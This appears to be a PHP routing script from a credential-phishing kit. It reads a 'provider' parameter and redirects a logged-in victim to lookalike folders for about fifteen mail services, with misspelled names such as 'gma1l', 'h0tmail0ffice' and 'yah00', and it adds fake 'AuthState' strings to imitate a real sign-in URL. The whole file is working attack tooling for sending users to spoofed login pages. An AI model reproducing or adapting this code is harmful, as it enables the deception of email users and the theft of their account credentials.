<?php 
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['email'])&&!empty($_SESSION['email'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
	
				
				}else{
		
		die();
		}

$onclick = "docon.php";
$uricomp = "AuthState=_8b84cec567b1f281e967942a311e80e59edb25def1";
$sessvar = "567b1f28180e59ede967942a311eb25def1_8b84cec";
$randedlast = "567b1f28180e59ede967942a311eb25def1_8b84cec_8b84c";




$email = $_SESSION['email'];
$dom = $_GET['provider'];
if ($dom == "msn") {
$folder = "h0tmail0ffice/";
$loader = "img/offc.png";	
	}else if ($dom == "yahoo") {
$folder = "yah00/";	
$loader = "img/yhoo_1.png";	
		}else if ($dom == "cox") {
$folder = "cox/";	
$loader = "img/yhoo_1.png";	
		}else if ($dom == "aol") {
$folder = "a0l/";
$loader = "img/aol_1.png";		
		}else if ($dom == "google") {
$folder = "gma1l/";	
$loader = "img/gml_1.png";	
		}else if ($dom == "office") {
$folder = "h0tmail0ffice/";	
$loader = "img/out.png";	
		}else if ($dom == "rackspace") {
$folder = "rackspac3/";	
$loader = "img/webm.png";	
		}else if ($dom == "godaddy") {
$folder = "g0daddy/";
$loader = "img/webm.png";		
		}else if ($dom == "earthlink") {
$folder = "earthl1nk/";	
$loader = "img/webm.png";	
		}else if ($dom == "juno") {
$folder = "jun0/";	
$loader = "img/webm.png";	
		}else if ($dom == "netzero") {
$folder = "netzer0/";	
$loader = "img/webm.png";	
		}else if ($dom == "centurylink") {
$folder = "centuryl1nk/";	
$loader = "img/webm.png";	
		}else if ($dom == "comcast") {
$folder = "c0mcast/";
$loader = "img/webm.png";		
		}else if ($dom == "rr") {
$folder = "rrc0m/";	
$loader = "img/webm.png";	
		}else if ($dom == "optonline") {
$folder = "opt0nline/";	
$loader = "img/webm.png";	
		}else {
$folder = "webhook/";	
$loader = "img/webm.png";		
		}

header("Location: $folder?$uricomp&$sessvar&$randedlast");	
?>